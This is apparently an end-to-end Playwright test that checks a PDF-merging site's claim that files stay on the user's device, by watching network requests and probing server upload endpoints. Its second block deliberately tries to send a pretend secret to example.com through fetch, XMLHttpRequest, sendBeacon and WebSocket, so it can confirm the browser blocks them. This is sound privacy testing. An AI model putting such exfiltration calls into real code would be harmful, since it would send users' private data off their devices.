// The claim, tested rather than asserted.
//
// The site tells people their files never leave the device. This drives a
// real PDF through a real browser and watches every request, then tries to
// send data out on purpose to confirm the browser refuses.
//
// Run it yourself. Start the server, then: node tests/privacy.e2e.mjs

import { chromium } from "playwright"
import { PDFDocument } from "@cantoo/pdf-lib"
import { mkdtemp, writeFile, rm } from "node:fs/promises"
import { tmpdir } from "node:os"
import { join } from "node:path"

const BASE = process.env.BASE || "http://127.0.0.1:8000"
const work = await mkdtemp(join(tmpdir(), "retroprivacy-"))

let passed = 0
let failed = 0

function check(name, ok, detail) {
  if (ok) {
    passed++
    console.log("  ok    " + name)
  } else {
    failed++
    console.log("  FAIL  " + name + (detail ? "  " + detail : ""))
  }
}

const ours = (url) =>
  url.startsWith(BASE) || url.startsWith("blob:") || url.startsWith("data:")

const browser = await chromium.launch()

try {
  // --- a real file, driven through a real tool ---------------------------
  {
    console.log("\nmerging a PDF while watching every request")
    const doc = await PDFDocument.create()
    for (let i = 0; i < 5; i++) doc.addPage([300, 400])
    const file = join(work, "passport.pdf")
    await writeFile(file, await doc.save())

    const page = await browser.newPage({ acceptDownloads: true })
    const requests = []
    page.on("request", (r) =>
      requests.push({ url: r.url(), body: r.postData()?.length || 0 }))

    await page.goto(BASE + "/merge-pdf", { waitUntil: "networkidle" })
    await page
      .waitForFunction(() => document.body.classList.contains("intro-done"), { timeout: 20000 })
      .catch(() => {})
    await page.waitForTimeout(1200)

    await page.setInputFiles("#picker", file)
    await page.waitForFunction(
      () => !document.querySelector("#download").disabled, { timeout: 30000 })
    const wait = page.waitForEvent("download", { timeout: 30000 })
    await page.click("#download")
    await wait
    await page.waitForTimeout(1500)

    const offsite = requests.filter((r) => !ours(r.url))
    const withBody = requests.filter((r) => r.body > 0)

    check("nothing is requested from another host", offsite.length === 0,
      offsite.map((r) => r.url).join(", "))
    check("no request carries a body", withBody.length === 0,
      withBody.map((r) => r.url).join(", "))
    await page.close()
  }

  // --- the browser's own refusal ------------------------------------------
  {
    console.log("\ntrying to send data out on purpose")
    const page = await browser.newPage()

    // Only what actually completed counts. The "request" event fires when the
    // browser starts a request, which happens before the policy is consulted,
    // so an attempt that was then refused would look like a leak.
    const escaped = []
    page.on("response", (r) => { if (!ours(r.url())) escaped.push("response " + r.url()) })
    page.on("requestfinished", (r) => { if (!ours(r.url())) escaped.push("finished " + r.url()) })

    await page.goto(BASE + "/merge-pdf", { waitUntil: "networkidle" })

    // Every ordinary way a page can send something, attempted deliberately.
    // sendBeacon is included because it returns true on queueing, before the
    // policy is consulted, so only the wire says whether it left.
    await page.evaluate(async () => {
      const secret = "PRETEND THIS IS A PASSPORT"
      const swallow = async (fn) => { try { await fn() } catch {} }
      await swallow(() => fetch("https://example.com/x", { method: "POST", body: secret }))
      await swallow(() => {
        const x = new XMLHttpRequest()
        x.open("POST", "https://example.com/x", false)
        x.send(secret)
      })
      await swallow(() => navigator.sendBeacon("https://example.com/x", secret))
      await swallow(() => new WebSocket("wss://example.com/x"))
      await swallow(() => fetch("/anything", { method: "POST", body: secret }))
    })
    await page.waitForTimeout(3000)

    check("the browser let none of it through", escaped.length === 0,
      escaped.join(", "))
    await page.close()
  }

  // --- there is nowhere to send a file even if something tried ------------
  {
    console.log("\nasking the server to accept data")
    const page = await browser.newPage()
    for (const path of ["/", "/merge-pdf", "/upload", "/api/upload"]) {
      const response = await page.request.post(BASE + path, { data: "x" })
        .catch(() => null)
      check(`POST ${path} is refused`,
        !response || response.status() >= 400,
        response ? String(response.status()) : "no response")
    }
    await page.close()
  }
} finally {
  await browser.close()
  await rm(work, { recursive: true, force: true })
}

console.log("\n" + passed + " passed, " + failed + " failed")
process.exit(failed ? 1 : 0)
